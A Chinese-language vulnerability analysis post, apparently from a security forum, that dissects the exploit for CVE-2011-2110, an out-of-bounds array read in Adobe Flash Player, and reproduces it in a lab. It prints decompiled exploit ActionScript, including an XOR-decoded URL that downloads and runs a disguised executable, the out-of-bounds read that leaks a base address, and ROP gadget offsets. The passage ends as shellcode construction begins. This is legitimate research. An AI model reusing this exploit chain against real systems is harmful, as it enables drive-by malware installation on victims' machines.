

# [原创] CVE-2011-2110 Adobe Flash Player 数组越界访问漏洞分析

## 1. 前言

这次看的漏洞是`CVE-2011-2110`，Adobe Flash中的数组越界访问漏洞。虽然越界访问与溢出漏洞都发生了“越界”，但是不管是栈溢出还是堆溢出，最终都能够做到越界写的行为，而数组越界访问，只能做到泄露部分内存数据，和溢出漏洞相比威力小了很多，漏洞利用的方法也更难一些。

## 2. 漏洞利用 SWF 文件的初步分析

书中提供的漏洞利用文件是一个HTML文件，漏洞本身存在于Adobe Flash Player中，这里通过在HTML中嵌入SWF文件的方式，实现恶意文件的传播，真正进行漏洞利用的是嵌入的SWF文件。

```html
<param name="movie" value="main.swf?info=02e6b1525353caa8ad555555ad31b637b436aeb1b631b1ad35b355b5a93534ab51d3527b7ab7387656" />
```

所以先来分析一下这个SWF文件，可以使用`JPEXS Free Flash Decompiler`工具对SWF文件进行反编译，得到的代码并不长，只有600+。

代码的开头就在对参数进行处理，可以注意到在嵌入SWF文件的时候，传入了一个`info`参数，这里处理的就是这个参数：

```actionscript
var param:Object = root.loaderInfo.parameters;
var t_url:ByteArray = this.hexToBin(param["info"]);
i = 0;
i = 0;
while(i < t_url.length)
{
    t_url[i] ^= 122;
    i++;
}
t_url.uncompress();
```

使用<a href="elink@ac2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4j5$3S2I4i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6o6P5h3u0W2M7V1y4Z5k6h3j5`.">CyberChef</a>按照代码的处理方法对`info`参数进行处理，可以得到最终结果：`<mark class="encrypted">2c3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4E0j5$3W2S2i4K6u0W2K9h3&6X3L8#2)9J5c8X3c8G2N6$3&6Q4x3V1k6U0k6q4)9J5k6i4c8^5N6q4)9$3x3l9`.</mark>

![图片描述](upload/attach/202108/600394_ZZQMW4KM6D8B9RN.png)

之后代码对环境进行了判断：

```actionscript
var error_arr:ByteArray = new ByteArray();
error_arr.writeByte(2053208673);
error_arr.writeObject(error_arr);
var browser:String = ExternalInterface.call("eval","navigator.userAgent");
if(!(browser.toLowerCase().indexOf("msie") > 0 || browser.toLowerCase().indexOf("firefox") > 0))
{
    error_arr.uncompress();
}
if(browser.toLowerCase().indexOf("chrome") > 0)
{
    error_arr.uncompress();
}
if(Capabilities.isDebugger || Capabilities.supports64BitProcesses || Capabilities.isEmbeddedInAcrobat)
{
    error_arr.uncompress();
}
```

可以看到这个代码针对的是IE和Firefox浏览器，其他浏览器都会报错，最后还检查了是否为调试版本、处理器是否为64位，以及是否内嵌在Acrobat PDF中，任意一种情况符合都会报错。

最后代码使用一开始从`info`参数解码出来的字符串，进行了URL请求：

```actionscript
var url_str:String = String(t_url);
loader = new URLLoader();
loader.dataFormat = URLLoaderDataFormat.BINARY;
loader.addEventListener(Event.COMPLETE,onLoadComplete);
loader.load(new URLRequest(t_url.toString()));
```

可见这个代码会联网下载其他文件，同时在下载完成后，执行`onLoadComplete`函数。

```actionscript
onLoadComplete = function(param1:Event):void
{
    content = loader.data;
    i = 0;
    while(i < content.length)
    {
        content[i] ^= 122;
        ++i;
    }
    content.uncompress();
    content_len = content.length;
    var _loc2_:ByteArray = new ByteArray();
    code = _loc2_;
    _loc2_.position = 1024 * 1024;
    _loc2_.writeInt(2053274210);
    _loc2_.writeInt(2053339747);
    _loc2_.writeInt(2053405283);
    _loc2_.writeObject(_loc2_);
    test();
    trace(_loc2_.length);
};
```

该函数会对下载的文件进行解密，解密方法和`info`参数一样。

之后创建了一个`ByteArray _loc2_`，目前还不知道这个变量有什么用，最后调用了`test()`函数。

`test`函数占据了这个文件的大部分篇幅，漏洞利用的内容应该也在这个函数中。

## 3. 测试漏洞利用文件执行情况

### 3.1 环境搭建

Flash版本：10.3.181.23（下载地址：<a href="elink@86eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8X3k6D9j5i4y4Z5M7r3I4S2P5h3g2J5j5i4u0U0K9r3W2$3k6b7`.`."><mark class="encrypted">2c0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8X3k6D9j5i4y4Z5M7r3I4S2P5h3g2J5j5i4u0U0K9r3W2$3k6b7`.`.</mark></a>）

**漏洞利用主机：**

- 操作系统：Win7 32位 SP1简体中文专业版
- IE：8.0.7601.17514

**服务器主机：**

- 操作系统任意
- phpstudy：8.1.1.3

#### 3.1.1 模拟服务器主机

IP地址：`192.168.6.198`

由于`amcia.info`已经无法访问，需要自己搭建一个服务器模仿该网站。

使用phpstudy搭建服务器环境，打开Apache服务，在WWW根目录下放置以下文件，文件书籍配套资料有提供：

```text
down\
cd.txt
cve-2011-2110.html
main.swf
crossdomain.xml
```

其中的`crossdomain.xml`是自己创建的，内容如下：

```xml
<?xml version="1.0"?>
<cross-domain-policy>
<allow-access-from domain="*" />
</cross-domain-policy>
```

有了这个文件就允许任意域名跨域访问资源了。

#### 3.1.2 漏洞利用主机

IP地址：`192.168.6.40`

修改hosts文件，添加记录：

```text
192.168.6.198 www.amcia.info
```

使用Fiddler抓包查看网络连接情况，使用Process Explorer监控进程执行情况。

之后打开IE，访问`<mark class="encrypted">650K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4E0j5$3W2S2i4K6u0W2K9h3&6X3L8#2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3e0q4Q4x3X3b7J5x3e0p5H3i4K6u0W2K9s2c8E0L8q4)9$3x3q4!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4g2)9^5c8W2!0m8c8W2!0q4y4q4!0n7b7W2!0m8y4g2!0q4y4#2)9&6b7#2)9^5b7W2!0q4y4g2)9^5z5q4!0n7x3p5k6A6k6r3c8D9k6i4u0Q4c8e0c8Q4b7U0S2Q4b7f1c8Q4c8f1k6Q4b7V1y4Q4z5f1p5`.</mark>

![图片描述](upload/attach/202108/600394_7DDQ8UJT94CCSTN.png)

以及Process Explorer中：

![图片描述](upload/attach/202108/600394_A58XYBSVC434D3G.png)

由于我之前设置了WinDbg作为默认调试器，因此，此时WinDbg已经自动弹出来了：

```text
(e04.810): Invalid lock sequence - code c000001e (!!! second chance !!!)
eax=00000000 ebx=7ffd4000 ecx=00000000 edx=004033d9 esi=00000000 edi=00000000
eip=00403425 esp=0012ff5c ebp=0012ff88 iopl=0 nv up ei ng nz ac po cy
cs=001b ss=0023 ds=0023 es=003b fs=003b gs=0000 efl=00010293
*** ERROR: Module load completed but symbols could not be loaded for C:\Users\test\AppData\Local\Temp\Low\scvhost.exe
scvhost+0x3425:
00403425 f04b lock dec ebx
```

在此也可以看出`scvhost.exe`的路径在临时文件夹中。

**注：这里用于实验的`main.swf`并不是特别稳定，因此需要选择合适的Flash版本才能执行到`scvhost.exe`出现，除此之外，Windows要选择32位的，IE版本也不能太高，我也是实验了几次才最终得到了这个结果。**

根据之前对代码简单分析，这里出现异常的`scvhost.exe`应该就是`cd.txt`解码之后的结果，`main.swf`利用了Adobe Flash中存在的漏洞，实现了恶意程序的执行。所以现在的问题应该是`main.swf`是怎样利用了这个漏洞，而不是最终执行起来的恶意程序为什么出现了异常。

书中提供了针对SWF文件，在漏洞利用早期触发异常，从而定位漏洞位置的方法。

## 4. 触发异常，定位漏洞位置

对于用于漏洞利用的SWF文件，可以直接修改反编译得到的脚本代码，再使用工具<a href="elink@0c7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8g2)9J5k6h3#2&6j5i4m8H3i4K6u0W2j5$3!0E0i4K6u0r3L8%4u0A6k6$3W2F1j5h3I4Q4x3V1k6a6k6X3k6A6j5$3g2Q4x3V1k6r3L8r3q4K6K9p5u0#2K9h3I4V1k6i4u0Q4y4h3j5@1i4K6g2X3y4W2)9#2k6V1I4e0x3e0m8Q4y4h3j5K6x3U0f1J5y4U0S2Q4x3X3g2W2P5r3f1`.">Flash Builder</a>重新进行编译，生成新的SWF文件。但是应该怎么修改呢？需要分析一下反编译得到的代码：

漏洞利用的主要代码都集中在`test`函数中，这个函数代码开头是这样的：

```actionscript
public function test(... rest) : void
{
    var _loc8_:int = 0;
    var _loc2_:Number = new Number(parseFloat(String(rest[0x4000000E])));
    var _loc3_:ByteArray = new ByteArray();
    _loc3_.position = 0;
    _loc3_.writeDouble(_loc2_);
    var _loc4_:uint = _loc3_[0] * 0x1000000 + _loc3_[1] * 0x10000 + _loc3_[2] * 0x100 + _loc3_[3];
    this.baseaddr = _loc4_;
    this.code.position = 0;
    this.code.endian = Endian.LITTLE_ENDIAN;
    this.code.writeInt(this.pobj - 1 + 16 + 409600);
    this.code.endian = Endian.BIG_ENDIAN;
    this.code.writeUnsignedInt(0x41414141);
    this.code.writeUnsignedInt(0x41414141);
    this.code.writeUnsignedInt(0x41414141);
    _loc8_ = 0;
    while(_loc8_ < 102400)
    {
        this.code.writeUnsignedInt(0x41414141);
        _loc8_++;
    }
    ...
}
```

一开始的`_loc2_`从`rest`参数数组的`0x4000000E`偏移处读取了一个数值，这里肯定是有问题的，正常来说不可能是这么大的偏移。所以漏洞就出现在这里，它允许对`rest`参数数组进行越界的读取。但是这个越界读取对应到Adobe Flash软件中，又是什么情况呢？

继续往下看，读取的这个数经过处理之后变成了`this.baseaddr`。也就是说，由于漏洞的存在，我们可以通过越界读取获取内存中的保存的数据，并在之后使用。

`test`函数后面利用这个`baseaddr`，通过进一步计算，得到了更多的后续使用的数值：

```actionscript
this.xchg_eax_esp_ret = this.baseaddr - 0x3F48E7;
this.xchg_eax_esi_ret = this.baseaddr - 0x2FF589;
this.pop_eax_ret = this.baseaddr - 0x405D48;
this.VirtualAlloc = this.baseaddr + 0xA6626;
this.jmp_eax = this.baseaddr - 0x3FF11F;
this.pop_ecx = this.baseaddr - 0x405DA0;
this.mov_eax_ecx = this.baseaddr - 0x3B90CC;
this.inc_eax_ret = this.baseaddr - 0x405D4C;
this.dec_eax_ret = this.baseaddr - 0x3BBD96;
this.to_eax = this.baseaddr - 0x3ADC67;
this.virtualprotect = this.baseaddr + 0xA65F2;
```

不同的Flash版本计算的数值不同，这也是为什么一开始环境搭建的时候有些Flash版本并没有成功进行漏洞利用，因为这里的代码并没有考虑所有的情况，对环境依赖严重。

之后开始构建shellcode，后续还存在两次利用数组越界读取获取信息的代码：

